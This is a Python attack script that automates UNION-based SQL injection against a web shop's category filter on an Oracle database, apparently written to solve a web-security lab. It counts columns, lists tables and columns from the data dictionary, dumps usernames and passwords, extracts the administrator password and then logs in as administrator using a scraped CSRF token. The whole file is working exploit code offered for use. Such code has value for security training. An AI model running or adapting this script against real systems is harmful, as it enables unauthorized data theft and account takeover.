#!/usr/bin/env python3
import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {"http": "http:127.0.0.1:8080", "https": "https:127.0.0.1:8080"}

PATH = "/filter?category=Pets"

# determine column count
def get_columns(url):
    for i in range(1,51):
        print(f"[*] Testing column count: {i}")
        nulls = ",".join(["NULL"] * i)
        sql_payload = f"' UNION SELECT {nulls} FROM dual--"
        r = requests.get(url + PATH + sql_payload, verify=False)
        if "Internal Server Error" not in r.text:
            return i
    return False

# find users table
def find_users_table(url):
    sqli_payload = "' UNION SELECT null,table_name FROM all_tables--"
    r = requests.get(url + PATH + sqli_payload, verify=False)
    res = r.text
    soup = BeautifulSoup(res, "html.parser")
    users_table = soup.find(string=re.compile(r'^users_[a-z0-9]+$', re.I))
    if users_table:
        return users_table
    else:
        return False

# find username and password columns
def find_users_columns(url, u_table):
    sql_payload = f"' UNION SELECT null,column_name FROM all_tab_columns WHERE table_name='{u_table}'--"
    r = requests.get(url + PATH + sql_payload, verify=False)
    res = r.text
    soup = BeautifulSoup(res, "html.parser")
    users_name_column = soup.find(string=re.compile(r'username', re.I))
    users_pass_column = soup.find(string=re.compile(r'password', re.I))
    if users_name_column and users_pass_column:
        return users_name_column, users_pass_column
    else:
        return False

# dump credentials
def cred_dump(url, u_table, username_col, password_col):
    sqli_payload = f"' UNION SELECT null,{username_col} || ':' || {password_col} FROM {u_table}--"
    r = requests.get(url + PATH + sqli_payload, verify=False)
    soup = BeautifulSoup(r.text, "html.parser")
    for td in soup.find_all("td"):
        if "administrator:" in td.text:
            creds = td.text.strip()
            password = creds.split(":")[1]
            print("[+] Administrator password discovered")
            return password
    return None

# get csrf token
def get_csrf_token(s, url):
    r = s.get(url + "/login", verify=False)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input")["value"]
    return csrf

# login as admin
def admin_login(s, url,dump):
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf, "username": "administrator", "password": dump}
    r = s.post(url + "/login", data=data, verify=False)
    res = r.text
    if "Log out" in res:
        return True
    return False    


def main():
    if len(sys.argv) != 2:
        print("[*] Usage: %s <url>" % sys.argv[0])  
        sys.exit()
    url = sys.argv[1].strip()

    col_num = get_columns(url)
    if col_num:
        print("[+] The number of columns is: " + str(col_num))  
    
    u_table = find_users_table(url)
    if u_table:
        print("[+] The users table is named: " + str(u_table))
    
    u_columns = find_users_columns(url, u_table)
    if u_columns:
        print("[+] The username and password columns are: " + str(u_columns))
        username_col, password_col = u_columns
    
    dump = cred_dump(url, u_table, username_col, password_col)
    if dump:
        print("[+] The administrator password is: " + str(dump))

        s = requests.Session()
        if admin_login(s, url, dump):
            print("[+] Successfully logged in as the administrator") 
        else:
            print("[-] Login failed")       

if __name__=="__main__":
    main()

